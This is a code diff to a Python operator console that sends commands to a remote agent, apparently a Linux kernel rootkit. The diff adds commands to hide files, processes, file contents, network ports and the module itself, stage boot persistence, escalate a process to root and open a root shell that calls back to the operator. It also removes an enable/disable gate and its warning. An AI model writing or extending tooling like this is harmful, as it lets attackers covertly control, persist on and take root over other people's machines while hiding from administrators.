@@ -38,22 +38,28 @@ SHELL_STATUS = re.compile(
     r"(idle|connecting|running|exited|refused|timed-out|failed|stopped) "
     r"(-?[0-9]+)"
 )
-COMMAND_HELP = """Observe
-  status          show action and worker state
-  ping            test the control channel
-  info            identify the agent
+COMMAND_HELP = """Hide
+  hide file PREFIX      hide files with this prefix from directory listings
+  hide pid PID          hide this PID from /proc
+  hide content STRING   hide lines containing this string from file reads
+  hide port PORT        hide this port from /proc/net/tcp
+  unhide CATEGORY N     unhide target at index N
+  unhide all            clear all hidden targets
 
-Act
-  enable          allow active operations
-  disable         stop active operations
-  worker          queue one resident-worker task
-  shell           open interactive root Bash
-  shell status    show the latest shell result
-  mark TEXT       record one operator marker
+Operate
+  persist               stage a boot-load request
+  hide module           hide module from lsmod
+  unhide module         restore module visibility
+  escalate PID          escalate process to root
+  shell                 open interactive root Bash
+  shell status          show the latest shell result
+  status                show current state and hidden targets
 
 Session
-  help            show these commands
-  quit            disconnect
+  ping                  test the control channel
+  info                  identify the agent
+  help                  show these commands
+  quit                  disconnect
 """
 CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
 SESSION_FILES = frozenset((
@@ -668,6 +674,51 @@ def _encode_control_command(command: str) -> bytes:
     return payload
 
 
+def _parse_operator_command(line: str) -> str | None:
+    parts = line.strip().split(None, 2)
+    if not parts:
+        return None
+    verb = parts[0].lower()
+    if verb == "hide" and len(parts) == 3:
+        category = parts[1].lower()
+        value = parts[2]
+        if category in ("file", "pid", "content", "port"):
+            return f"HIDE {category.upper()} {value}"
+    elif verb == "unhide":
+        if len(parts) == 2 and parts[1].lower() == "all":
+            return "UNHIDE ALL"
+        if len(parts) == 3:
+            category = parts[1].lower()
+            index = parts[2]
+            if category in ("file", "pid", "content", "port") and index.isdigit():
+                return f"UNHIDE {category.upper()} {index}"
+    elif verb == "list" and len(parts) == 2:
+        category = parts[1].lower()
+        if category in ("file", "pid", "content", "port"):
+            return f"LIST {category.upper()}"
+    elif verb == "status":
+        return "STATUS"
+    elif verb == "persist":
+        return "PERSIST"
+    elif verb == "hide" and len(parts) == 2 and parts[1].lower() == "module":
+        return "HIDE MODULE"
+    elif verb == "unhide" and len(parts) == 2 and parts[1].lower() == "module":
+        return "UNHIDE MODULE"
+    elif verb == "escalate" and len(parts) == 2 and parts[1].isdigit():
+        return f"ESCALATE {parts[1]}"
+    elif verb == "shell":
+        if len(parts) > 1 and parts[1].lower() == "status":
+            return "SHELL STATUS"
+        return f"SHELL {GUEST_SHELL_PORT}"
+    elif verb == "ping":
+        return "PING"
+    elif verb == "info":
+        return "INFO"
+    elif verb == "quit":
+        return "QUIT"
+    return None
+
+
 def _next_control_command(
     input_stream: TextIO,
     output: Callable[[str], None],
@@ -684,32 +735,16 @@ def _next_control_command(
         if command.lower() in ("help", "?"):
             output(COMMAND_HELP)
             continue
-        lowered = command.lower()
-        simple = {
-            "status": "STATUS",
-            "enable": "ENABLE",
-            "disable": "DISABLE",
-            "worker": "RUN",
-            "shell status": "SHELL STATUS",
-            "ping": "PING",
-            "info": "INFO",
-            "quit": "QUIT",
-        }
-        if lowered == "shell":
-            command = f"SHELL {GUEST_SHELL_PORT}"
-        elif lowered.startswith("mark "):
-            command = "MARK " + command[5:]
-        elif lowered in simple:
-            command = simple[lowered]
-        else:
+        wire = _parse_operator_command(command)
+        if wire is None:
             warning(f"unknown command: {command}; type help")
             continue
         try:
-            payload = _encode_control_command(command)
+            payload = _encode_control_command(wire)
         except OperatorError as error:
             warning(str(error))
             continue
-        return command, payload
+        return wire, payload
 
 
 def _poll_shell_status(
@@ -837,8 +872,6 @@ def run_control_console(
                 "ascii", errors="replace"
             )
             output(f"recv    {reply}\n")
-            if command_text.startswith("SHELL ") and reply == "ERR disabled":
-                warning("actions are disabled; use enable first")
             if reply.startswith("OPEN "):
                 request_id, cookie = parse_shell_ticket(reply)
                 output("wait    shell    target callback\n")
